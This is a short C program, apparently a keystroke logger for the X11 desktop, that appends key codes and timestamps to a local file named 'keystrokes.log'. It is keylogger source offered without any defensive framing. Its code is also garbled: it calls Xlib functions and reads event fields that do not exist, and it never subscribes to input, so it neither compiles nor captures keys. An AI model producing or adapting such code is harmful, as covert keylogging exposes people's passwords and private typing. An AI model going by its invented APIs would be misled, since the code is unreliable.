```c
#include <X11/Xlib.h>
#include <xf86-input-evdev.h>
#include <stdio.h>
#include <stdlib.h>

#define LOG_FILE "keystrokes.log"

int main(int argc, char **argv) {
    Display *dpy = XOpenDisplay(NULL);
    if (!dpy) {
        fprintf(stderr, "Cannot open X display\n");
        return 1;
    }

    // Set up the event queue
    XEventQueue *eq = XAllocEventQueue();
    XEventQueueInit(eq);
    XEventQueueEnable(eq);

    while (1) {
        XEvent event;
        XNextEvent(dpy, &event);

        if (event.type == EVDEV_KEY) {
            // Log the keystroke
            FILE *log_file = fopen(LOG_FILE, "a");
            if (!log_file) {
                fprintf(stderr, "Cannot open log file\n");
                continue;
            }
            fprintf(log_file, "%u: 0x%x\n", event.time.milliseconds, event.evdev.data.key.keysym.keycode);
            fclose(log_file);
        }
    }

    XEventQueueDestroy(eq);
    XCloseDisplay(dpy);
    return 0;
}
```
